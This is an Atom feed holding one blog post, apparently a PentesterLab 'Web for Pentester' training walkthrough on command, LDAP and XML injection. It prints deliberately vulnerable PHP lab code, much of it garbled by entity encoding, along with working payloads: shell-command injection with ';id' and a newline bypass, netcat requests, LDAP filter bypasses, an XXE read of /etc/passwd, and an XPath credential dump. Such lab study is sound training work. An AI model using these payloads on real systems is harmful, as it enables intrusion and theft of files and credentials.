<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: xml injection | F4l13n5n0w]]></title>
  <link href="http://f4l13n5n0w.github.io/blog/categories/xml-injection/atom.xml" rel="self"/>
  <link href="http://f4l13n5n0w.github.io/"/>
  <updated>2016-01-24T05:59:02-05:00</updated>
  <id>http://f4l13n5n0w.github.io/</id>
  <author>
    <name><![CDATA[F4l13n5n0w]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] Web for Pentester - FINAL]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/23/pentesterlab-web-for-pentester-final/"/>
    <updated>2015-05-23T00:52:14-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/23/pentesterlab-web-for-pentester-final</id>
    <content type="html"><![CDATA[<p>&ldquo;This course details all you need to know to start doing web penetration testing. PentesterLab tried to put together the basics of web testing and a summary of the most common vulnerabilities with the LiveCD to test them.&rdquo; &ndash; PentesterLab</p>

<p>Due to this is quite a long course, I have to divide the course into several parts and this is the last one will focus on several different types of injection: Commands injection, LDAP injection and XML injection. More information and ISO download please check <a href="https://www.pentesterlab.com/exercises/web_for_pentester/">here</a>. The official <a href="https://www.pentesterlab.com/exercises/web_for_pentester/course">course</a> is highly recommanded to read.</p>

<p>Difficulty: 1 / 5</p>

<!-- more -->


<h1>Commands Injection</h1>

<p><blockquote><p>Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.</p><footer><strong>OWASP <a href="https://www.owasp.org/index.php/Command_Injection">https://www.owasp.org/index.php/Command_Injection</a> Command Injection</strong></footer></blockquote></p>

<h2>Example 1</h2>

<p>Code review:
<figure class='code'><figcaption><span>example1.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span> <span class="cp">?&gt;</span><span class="x">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;pre&gt;</span>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>  <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ping -c 2 &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;/pre&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;&amp;lt;?php require_once(&amp;ldquo;../footer.php&amp;rdquo;); ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This one is simple and directly exploitable.</p>

<p>From the page we know the command ping $ip is running on server side and return the result to the client. Due to there is no input validation, we can inject payload to construct multi commands in one line with &ldquo;;&rdquo;, &ldquo;|&rdquo; or &ldquo;&amp;&amp;&rdquo;, for example, &ldquo;ping 127.0.0.1; id&rdquo; or &ldquo;ping 127.0.0.1 &amp;&amp; id&rdquo;.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/commandexec/example1.php?ip=127.0.0.1 %26%26 id</code></p>

<p><code>http://10.10.10.129/commandexec/example1.php?ip=127.0.0.1; id</code></p>

<p><code>http://10.10.10.129/commandexec/example1.php?ip=127.0.0.1| id</code></p>

<h2>Example 2</h2>

<p>Code review:
<figure class='code'><figcaption><span>example2.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span> <span class="cp">?&gt;</span><span class="x">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;pre&gt;</span>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}$/m&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">])))</span> <span class="p">{</span>
</span><span class='line'>     <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Invalid IP address&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ping -c 2 &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;/pre&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;&amp;lt;?php require_once(&amp;ldquo;../footer.php&amp;rdquo;); ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>From the source code above, we can see that <a href="http://php.net/manual/en/reference.pcre.pattern.modifiers.php">PRCE Modifier &ldquo;m&rdquo;</a> is used in preg_match function. As a result, we can bypass this validation by using newline &ldquo;<em><font color="red">%0a</font></em>&rdquo;.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/commandexec/example2.php?ip=127.0.0.1%0aid</code></p>

<h2>Example 3</h2>

<p>Code review:
<figure class='code'><figcaption><span>example3.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span> <span class="cp">?&gt;</span><span class="x">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;pre&gt;</span>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}$/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">])))</span> <span class="p">{</span>
</span><span class='line'>     <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Location: example3.php?ip=127.0.0.1&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ping -c 2 &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;/pre&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;&amp;lt;?php require_once(&amp;ldquo;../footer.php&amp;rdquo;); ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time the <em>preg_match</em> function did a good validation on user&rsquo;s input. However, the script didn&rsquo;t stop when evil character is matched in user&rsquo;s input. Instead of, it only use header function to do a redirection without die function to stop the script.</p>

<p>So the attacking methods (&lsquo;;&rsquo;, &lsquo;&amp;&amp;&rsquo; and &lsquo;|&rsquo;) still works on this one, but it will need a proxy like <strong><em>burpsuite</em></strong> or <strong><em>nc/telnet</em></strong> to read the first response page.</p>

<p>PoC:</p>

<p>Use <strong><em>NC</em></strong> to exploit this vulnerability</p>

<p><code>echo -e "GET /commandexec/example3.php?ip=127.0.0.1;id HTTP/1.1\r\nHost: 10.10.10.129\r\nConnection: close\r\n" | nc 10.10.10.129 80</code></p>

<p><code>echo -e "GET /commandexec/example3.php?ip=127.0.0.1|id HTTP/1.1\r\nHost: 10.10.10.129\r\nConnection: close\r\n" | nc 10.10.10.129 80</code></p>

<p><code>echo -e "GET /commandexec/example3.php?ip=127.0.0.1%26%26id HTTP/1.1\r\nHost: 10.10.10.129\r\nConnection: close\r\n" | nc 10.10.10.129 80</code></p>

<h1>LDAP Injection</h1>

<p><blockquote><p>LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it’s possible to modify LDAP statements using a local proxy. This could result in the execution of arbitrary commands such as granting permissions to unauthorized queries, and content modification inside the LDAP tree. The same advanced exploitation techniques available in SQL Injection can be similarly applied in LDAP Injection.</p><footer><strong><a href="https://www.owasp.org/index.php/LDAP_injection">https://www.owasp.org/index.php/LDAP_injection</a> LDAP Injection</strong></footer></blockquote></p>

<h2>Example 1</h2>

<p>Code review:
<figure class='code'><figcaption><span>example1.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>  <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$ld</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>   <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">username</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
</span><span class='line'>     <span class="nv">$user</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">uid</span><span class="o">=&amp;</span><span class="nx">rdquo</span><span class="p">;</span><span class="o">.</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">username</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">ou</span><span class="o">=</span><span class="nx">people</span><span class="p">,</span><span class="nx">dc</span><span class="o">=</span><span class="nx">pentesterlab</span><span class="p">,</span><span class="nx">dc</span><span class="o">=</span><span class="nx">com</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>   <span class="p">}</span>
</span><span class='line'>   <span class="nv">$lb</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ldap_bind</span><span class="p">(</span><span class="nv">$ld</span><span class="p">,</span> <span class="nv">$user</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">password</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]);</span>
</span><span class='line'>   <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Due to the developer use ldap_bind function which will make an anonymous bind if both parameters are not specified, the attacker can bypass the authentication by removing all the parameters from the query.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/ldap/example1.php</code></p>

<h2>Example 2</h2>

<p>Code review:
<figure class='code'><figcaption><span>example2.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$pass</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;{</span><span class="nx">MD5</span><span class="p">}</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span><span class="o">.</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">H</span><span class="o">*&amp;</span><span class="nx">rdquo</span><span class="p">;,</span><span class="nb">md5</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">password</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;])));</span>
</span><span class='line'>    <span class="nv">$filter</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;(</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;(</span><span class="nx">cn</span><span class="o">=&amp;</span><span class="nx">rdquo</span><span class="p">;</span><span class="o">.</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;)(</span><span class="nx">userPassword</span><span class="o">=&amp;</span><span class="nx">rdquo</span><span class="p">;</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;))</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p>After checking the source code, the attacker can bypass the authentication by using the following exploit payload:</p>

<p><code>http://10.10.10.129/ldap/example2.php?name=hacker)(cn=*))%00&amp;password=asdfasdf</code></p>

<p>the variable <em>$filter</em> will become to &ldquo;<font color="red">(&amp;(cn=hacker)(cn=*))%00)(userPassword=[pass]))</font>&rdquo; which <strong><em>%00</em></strong> will get rid of all the following strings.</p>

<p>More information about testing LDAP injection, please check the OWASP article <a href="https://www.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-007)">Testing for LDAP Injection</a></p>

<h1>XML Injection</h1>

<h2>Example 1</h2>

<p>Code review:
<figure class='code'><figcaption><span>example1.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">Hello&lt;br/&gt;</span>
</span><span class='line'><span class="x">&amp;lt;?php</span>
</span><span class='line'><span class="x">  $xml=simplexml_load_string($_GET[&amp;lsquo;xml&amp;rsquo;]);</span>
</span><span class='line'><span class="x">  print_r((string)$xml);</span>
</span><span class='line'><span class="x">?&gt;</span>
</span><span class='line'><span class="x">&amp;lt;?php require_once(&amp;ldquo;../footer.php&amp;rdquo;); ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>XML eXternal Entity (XXE) attack:
<blockquote><p>External Entity: The set of valid entities can be extended by defining new entities. If the definition of an entity is a URI, the entity is called an external entity. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote systems. This behavior exposes the application to XML eXternal Entity (XXE) attacks, which can be used to perform denial of service of the local system, gain unauthorized access to files on the local machine, scan remote machines, and perform denial of service of remote systems.</p><footer><strong>OWASP <a href="https://www.owasp.org/index.php/Testing_for_XML_Injection_">https://www.owasp.org/index.php/Testing_for_XML_Injection_</a>(OTG-INPVAL-008) Testing_for_XML_Injection</strong></footer></blockquote></p>

<p>Attacking payload (read system file: /etc/passwd):</p>

<p><code>&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;test&gt;&amp;xxe;&lt;/test&gt;</code></p>

<p>PoC (with URL encoded):</p>

<p><code>http://10.10.10.129/xml/example1.php?xml=%3C%21DOCTYPE%20test%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2f%2f%2fetc%2fpasswd%22%3E%5D%3E%3Ctest%3E%26xxe%3B%3C%2ftest%3E</code></p>

<h2>Example 2</h2>

<p>Code review:
<figure class='code'><figcaption><span>example2.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>  <span class="nv">$x</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&lt;</span><span class="nx">data</span><span class="o">&gt;&lt;</span><span class="nx">users</span><span class="o">&gt;&lt;</span><span class="nx">user</span><span class="o">&gt;&lt;</span><span class="nx">name</span><span class="o">&gt;</span><span class="nx">hacker</span><span class="o">&lt;/</span><span class="nx">name</span><span class="o">&gt;&lt;</span><span class="nx">message</span><span class="o">&gt;</span><span class="nx">Hello</span> <span class="nx">hacker</span><span class="o">&lt;/</span><span class="nx">message</span><span class="o">&gt;&lt;</span><span class="nx">password</span><span class="o">&gt;</span><span class="nx">pentesterlab</span><span class="o">&lt;/</span><span class="nx">password</span><span class="o">&gt;&lt;/</span><span class="nx">user</span><span class="o">&gt;&lt;</span><span class="nx">user</span><span class="o">&gt;&lt;</span><span class="nx">name</span><span class="o">&gt;</span><span class="nx">admin</span><span class="o">&lt;/</span><span class="nx">name</span><span class="o">&gt;&lt;</span><span class="nx">message</span><span class="o">&gt;</span><span class="nx">Hello</span> <span class="nx">admin</span><span class="o">&lt;/</span><span class="nx">message</span><span class="o">&gt;&lt;</span><span class="nx">password</span><span class="o">&gt;</span><span class="nx">s3cr3tP4ssw0rd</span><span class="o">&lt;/</span><span class="nx">password</span><span class="o">&gt;&lt;/</span><span class="nx">user</span><span class="o">&gt;&lt;/</span><span class="nx">users</span><span class="o">&gt;&lt;/</span><span class="nx">data</span><span class="o">&gt;&amp;</span><span class="nx">rdquo</span><span class="p">;;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>  <span class="nv">$xml</span><span class="o">=</span><span class="nb">simplexml_load_string</span><span class="p">(</span><span class="nv">$x</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$xpath</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">users</span><span class="o">/</span><span class="nx">user</span><span class="o">/</span><span class="nx">name</span><span class="p">[</span><span class="o">.=&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="err">&#39;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;]</span><span class="o">/</span><span class="k">parent</span><span class="o">::*/</span><span class="nx">message</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>  <span class="nv">$res</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$xml</span><span class="o">-&gt;</span><span class="na">xpath</span><span class="p">(</span><span class="nv">$xpath</span><span class="p">));</span>
</span><span class='line'>  <span class="k">while</span><span class="p">(</span><span class="k">list</span><span class="p">(</span> <span class="p">,</span><span class="nv">$node</span><span class="p">)</span> <span class="o">=</span> <span class="nb">each</span><span class="p">(</span><span class="nv">$res</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">echo</span> <span class="nv">$node</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p>From the source code above, we know that variable $_GET[&lsquo;name&rsquo;] has no input validation and can be used to inject evil code.</p>

<p>In order to dump all the users' credentials, I use the payload &ldquo;<font color="red">&lsquo; or 1=1]%00</font>&rdquo; to construct the variable $xpath as follows:</p>

<p><code>users/user/name[.='' or 1=1]%00']/parent::*/message</code></p>

<p>Here <strong><em>%00</em></strong> will get rid of the following strings.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xml/example2.php?name=' or 1=1]%00</code></p>
]]></content>
  </entry>
  
</feed>
